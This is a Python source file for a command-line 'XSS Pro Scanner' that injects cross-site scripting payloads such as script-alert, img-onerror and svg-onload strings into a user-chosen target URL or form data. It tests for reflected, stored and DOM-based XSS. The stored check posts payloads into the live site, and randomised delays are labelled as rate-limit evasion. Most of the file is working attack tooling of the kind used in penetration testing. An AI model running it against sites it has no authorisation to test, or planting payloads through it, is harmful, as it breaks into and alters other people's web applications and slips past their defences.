import httpx
import asyncio
import time
import random
import re
import argparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rich.table import Table
from playwright.async_api import async_playwright

console = Console()

# Argument parser setup
arg_parser = argparse.ArgumentParser(description="XSS Pro Scanner")
arg_parser.add_argument('--payloads', help="Path to custom payload file", required=False)
args = arg_parser.parse_args()

# Load payloads from file or use default
if args.payloads:
    try:
        with open(args.payloads, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
        console.print(f"[bold green][+] Loaded {len(payloads)} custom payloads from {args.payloads}[/bold green]")
    except Exception as e:
        console.print(f"[bold red][!] Failed to load payloads from file: {e}[/bold red]")
        exit()
else:
    payloads = [
        '\"><script>alert(1)</script>',
        '\"><img src=x onerror=alert(1)>',
        '\"><svg/onload=alert(1)>',
        '\"><iframe onload=alert(1)>'
    ]
    console.print(f"[yellow][-] Using default payloads ({len(payloads)})[/yellow]")

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml"
}


async def check_reflected(url):
    console.print("\n[bold yellow]Running Reflected XSS scan...[/bold yellow]")
    for payload in payloads:
        full_url = url.replace("FUZZ", payload)
        try:
            r = httpx.get(full_url, headers=headers, timeout=10)
            if payload in r.text:
                console.print(f"[bold green][+] Reflected XSS found![/bold green] → {full_url}")
            elif r.status_code in [403, 429]:
                console.print(f"[bold red][!] Rate limit or block detected at:[/bold red] {full_url}")
            time.sleep(random.uniform(0.5, 2.5))  # Delay for rate-limit evasion
        except Exception as e:
            console.print(f"[red][-] Error accessing {full_url}: {e}[/red]")


async def check_stored(url, post_data):
    console.print("\n[bold yellow]Running Stored XSS scan...[/bold yellow]")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        for payload in payloads:
            data = post_data.replace("FUZZ", payload)
            try:
                r = httpx.post(url, data=dict(x.split('=') for x in data.split('&')), headers=headers)
                await asyncio.sleep(1.5)  # wait to store
                await page.goto(url)
                content = await page.content()
                if payload in content:
                    console.print(f"[bold green][+] Possible Stored XSS found with payload:[/bold green] {payload}")
            except Exception as e:
                console.print(f"[red][-] Stored XSS error: {e}[/red]")
        await browser.close()


async def check_dom_xss(url):
    console.print("\n[bold yellow]Running DOM-Based XSS scan...[/bold yellow]")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        for payload in payloads:
            test_url = url + f"#{payload}"
            try:
                await page.goto(test_url)
                content = await page.content()
                if payload in content:
                    console.print(f"[bold green][+] DOM-Based XSS Detected![/bold green] → {test_url}")
            except Exception as e:
                console.print(f"[red][-] DOM scan failed: {e}[/red]")
        await browser.close()


async def main():
    console.print("""
[bold cyan]╔═══════════════════════════════╗
║      XSS Pro Scanner v1.0  
║      made by Dev kumar                   ║
╚═══════════════════════════════╝[/bold cyan]
    """)

    url = Prompt.ask("[bold green]Enter target URL (use FUZZ to inject)[/bold green]")

    console.print("\n[bold magenta]Select scan type:[/bold magenta]")
    console.print("[cyan]1[/cyan]) Reflected XSS")
    console.print("[cyan]2[/cyan]) Stored XSS")
    console.print("[cyan]3[/cyan]) DOM-Based XSS")

    choice = IntPrompt.ask("[bold blue]Enter choice[/bold blue]", choices=["1", "2", "3"])

    if choice == 1:
        await check_reflected(url)
    elif choice == 2:
        post_data = Prompt.ask("[bold green]Enter POST data (use FUZZ for injection)[/bold green]")
        await check_stored(url, post_data)
    elif choice == 3:
        await check_dom_xss(url)


if __name__ == "__main__":
    asyncio.run(main())
